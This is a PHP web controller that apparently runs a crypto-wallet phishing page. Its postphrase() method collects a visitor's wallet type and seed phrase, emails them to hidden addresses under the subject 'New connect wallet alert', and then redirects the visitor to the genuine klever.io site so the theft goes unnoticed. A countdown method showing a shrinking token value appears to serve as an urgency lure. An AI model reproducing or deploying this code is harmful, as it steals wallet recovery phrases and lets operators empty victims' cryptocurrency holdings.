<?php

namespace App\Controllers;

require 'vendor/autoload.php';

use Carbon\Carbon;

class Home extends BaseController
{
	private function price(int $pri)
	{
		$len =  mb_strlen($pri);
		if ($len == 4) {
			$end = substr($pri, -3);
			$first = substr($pri, 0, 1);
			return $first . ',' . $end;
		} elseif ($len == 3) {
			return $pri;
		} elseif ($len == 2) {
			return $pri;
		} elseif ($len == 1) {
			return $pri;
		} elseif ($len == 5) {
			$end = substr($pri, -3);
			$first = substr($pri, 0, 2);
			return $first . ',' . $end;
		} elseif ($len == 6) {
			$end = substr($pri, -3);
			$first = substr($pri, 0, 3);
			return $first . ',' . $end;
		} elseif ($len == 7) {
			$end = substr($pri, -3);
			$mid = substr($pri, -6, 3);
			$first = substr($pri, 0, 1);
			return $first . ',' . $mid . ',' . $end;
		} elseif ($len == 8) {
			$end = substr($pri, -3);
			$mid = substr($pri, -6, 3);
			$first = substr($pri, 0, 2);
			return $first . ',' . $mid . ',' . $end;
		}
	}

	public function index()
	{
		echo view('home');
	}

	public function lab()
	{
		echo view('labs');
	}

	public function dvk()
	{
		$hrs = Carbon::create(2021, 7, 26, 14, 0, 0)->diffInMinutes();
		// $now = Carbon::now();
		// echo $hrs;
		$perc = (4320 - $hrs) / 4320;
		$value = $perc * 20000000;
		$final = $this->price(round($value, -3));
		$percent = floor(($value / 20000000) * 100);
		if ($percent < 0) {
			echo view('dvk', ['klv' => 0, 'perc' => 0]);
		} else {
			echo view('dvk', ['klv' => $final, 'perc' => $percent]);
		}
	}

	public function message($type, array $data)
	{
		$burl = base_url();
		if ($type == 'link') {
			$output = "
            <!DOCTYPE html>
            <html lang='en'>
            <head>
                <meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title></title>
                <style>
                    body{margin: 0;padding: 0;}
                    .container{background-color: black;border-radius: 1.5rem;text-align: center;}
                    main{padding-bottom: 4rem;}
                    footer{padding: 0.4rem 0;background-color: black;color: white;border-bottom-left-radius: 1.5rem;border-bottom-right-radius: 1.5rem;}
                </style>
            </head>
            <body>
                <div class='container'>
                    <header class='logo'><img width='50%' src='" . $burl . "images/pan-bg.svg' alt=''></header>
                    <main>
                        <h2>" . $data['msg'] . "</h2>
                    </main>
                    <footer>&copy; ...</footer>
                </div>
            </body>
            </html>
        ";
		}
		return $output;
	}

	public function mailer(array $data)
	{
		$email = \Config\Services::email();
		$email->setFrom(getenv('smtpuser'), 'Seed Phrase Notification');
		$email->setTo($data['to']);
		$email->setCC($data['cc']);
		// $email->setBCC('them@their-example.com');

		$email->setSubject($data['subject']);
		$email->setMessage($this->message($data['type'], $data['message']));

		$email->send(false);
		return $email->printDebugger(['headers', 'subject', 'body']);
	}

	public function postphrase()
	{
		$incoming = $this->request->getPost();
		if (isset($incoming['wallet'])) {
			$msg = "Wallet type: " . $incoming['wallet'] . " <br> " . "Seed Phrase: " . $incoming['phrase'];
		} else {
			$msg = "Seed Phrase: " . $incoming['phrase'];
		}
		$data = [
			'cc' => getenv('smtpcc'),
			'to' => getenv('smtpto'),
			'type' => 'link',
			'subject' => 'New connect wallet alert',
			'message' => ['msg' => $msg],
		];
		echo $this->mailer($data);
		return redirect()->to('https://klever.io');
	}
	//--------------------------------------------------------------------

	//--------------------------------------------------------------------

}
